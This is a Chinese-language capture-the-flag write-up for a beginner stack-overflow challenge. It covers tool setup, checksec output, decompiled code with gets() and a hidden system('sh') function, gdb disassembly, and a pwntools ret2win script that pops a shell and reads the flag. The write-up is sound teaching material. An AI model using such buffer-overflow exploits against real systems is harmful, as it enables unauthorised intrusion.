# [2024SpringTrains] welcome-to-pwn WriteUp

## 工具准备

### 一台 Linux 系统 (推荐 Debian 系的比如 Ubuntu 或 Kali Linux 的 虚拟机 / WSL)

[Kali WSL 安装教程](https://herveyb3b4.github.io/2023/11/30/How-to-install-Kali-WSL/) ~~趁机宣传一下博客~~

### gcd 调试工具

```shell
sudo apt install gdb
```

### pwntools

```shell
sudo apt install python3-pwntools
```

或者直接使用 `pip3` 安装

```shell
python3 -m pip install pwntools
```

## 过程记录

下载后获得文件 attachment

先使用 `file` 命令查看文件类型，发现是一个 ELF 64 位程序

```shell
┌──(hervey㉿Hervey)-[~/Downloads]
└─$ file ./attachment
./attachment: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ad1699dcda24040006490441da0f0e70ef03456, not stripped
```

接着使用 `checksec` 命令识别安全属性

```shell
┌──(hervey㉿Hervey)-[~/Downloads]
└─$ checksec --file=attachment
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols        No    0               1               attachment
```

可以发现无任何栈保护

使用 IDA 64 进行逆向

`main()` 函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[48]; // [rsp+0h] [rbp-30h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("Welcome to Stringer CTF 2024.");
  gets(v4);
  return 0;
}
```

同时我们还能找到一个 `try_to_call_me` 函数

```c
int try_to_call_me()
{
  return system("sh");
}
```

所以我们的目标应该是利用 `gets()` 这个危险函数的缓冲区溢出漏洞，将 `v4` 变量数据溢出到覆盖返回地址，实现跳转到执行 `system("sh")` 进而去获得 flag

使用 `gdb` 运行 `attachment` 获得变量 v4 的缓冲区大小以及 `system("sh")` 对应的位置

```shell

┌──(hervey㉿Hervey)-[~/Downloads]
└─$ gdb
GNU gdb (Debian 13.2-1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
(gdb) file attachment
Reading symbols from attachment...
(No debugging symbols found in attachment)
(gdb) disassemble main
Dump of assembler code for function main:
   0x000000000040069a <+0>:     push   %rbp
   0x000000000040069b <+1>:     mov    %rsp,%rbp
   0x000000000040069e <+4>:     sub    $0x30,%rsp
   0x00000000004006a2 <+8>:     mov    0x2009b7(%rip),%rax        # 0x601060 <stdout@@GLIBC_2.2.5>
   0x00000000004006a9 <+15>:    mov    $0x0,%ecx
   0x00000000004006ae <+20>:    mov    $0x2,%edx
   0x00000000004006b3 <+25>:    mov    $0x0,%esi
   0x00000000004006b8 <+30>:    mov    %rax,%rdi
   0x00000000004006bb <+33>:    call   0x400590 <setvbuf@plt>
   0x00000000004006c0 <+38>:    mov    0x2009a9(%rip),%rax        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x00000000004006c7 <+45>:    mov    $0x0,%ecx
   0x00000000004006cc <+50>:    mov    $0x2,%edx
   0x00000000004006d1 <+55>:    mov    $0x0,%esi
   0x00000000004006d6 <+60>:    mov    %rax,%rdi
   0x00000000004006d9 <+63>:    call   0x400590 <setvbuf@plt>
   0x00000000004006de <+68>:    mov    0x20099b(%rip),%rax        # 0x601080 <stderr@@GLIBC_2.2.5>
   0x00000000004006e5 <+75>:    mov    $0x0,%ecx
   0x00000000004006ea <+80>:    mov    $0x2,%edx
   0x00000000004006ef <+85>:    mov    $0x0,%esi
   0x00000000004006f4 <+90>:    mov    %rax,%rdi
   0x00000000004006f7 <+93>:    call   0x400590 <setvbuf@plt>
   0x00000000004006fc <+98>:    lea    0xa4(%rip),%rdi        # 0x4007a7
   0x0000000000400703 <+105>:   call   0x400560 <puts@plt>
   0x0000000000400708 <+110>:   lea    -0x30(%rbp),%rax
   0x000000000040070c <+114>:   mov    %rax,%rdi
   0x000000000040070f <+117>:   mov    $0x0,%eax
   0x0000000000400714 <+122>:   call   0x400580 <gets@plt>
--Type <RET> for more, q to quit, c to continue without paging--c
   0x0000000000400719 <+127>:   mov    $0x0,%eax
   0x000000000040071e <+132>:   leave
   0x000000000040071f <+133>:   ret
End of assembler dump.
(gdb) disassemble try_to_call_me
Dump of assembler code for function try_to_call_me:
   0x0000000000400687 <+0>:     push   %rbp
   0x0000000000400688 <+1>:     mov    %rsp,%rbp
   0x000000000040068b <+4>:     lea    0x112(%rip),%rdi        # 0x4007a4
   0x0000000000400692 <+11>:    call   0x400570 <system@plt>
   0x0000000000400697 <+16>:    nop
   0x0000000000400698 <+17>:    pop    %rbp
   0x0000000000400699 <+18>:    ret
End of assembler dump.
```

从这里我们可以得知:

* 变量 `v4` 的地址位于 `rbp-30h` ，64位程序还需要再加 8 位，即 `rbp-38h`
* `system("sh")` 语句对应的地址为 `0x000000000040068b`

由此我们可以写出脚本

```python
from pwn import *
p = remote("<IP Address>", <Port>)
payload = b'A' * 0x30 + b'12345678' + p64(0x40068B)
p.sendline(payload)
p.interactive()
```

运行该脚本，进入容器终端

```shell
┌──(hervey㉿ZHW)-[~/Downloads]
└─$ python3 ./sol.py
[+] Opening connection to <IP Address> on port <Port>: Done
[*] Switching to interactive mode
Welcome to Stringer CTF 2024.
$ ls
attachment
bin
dev
flag
lib
lib32
lib64
$ cat flag
flag{<flag>}
```

进而获得 flag
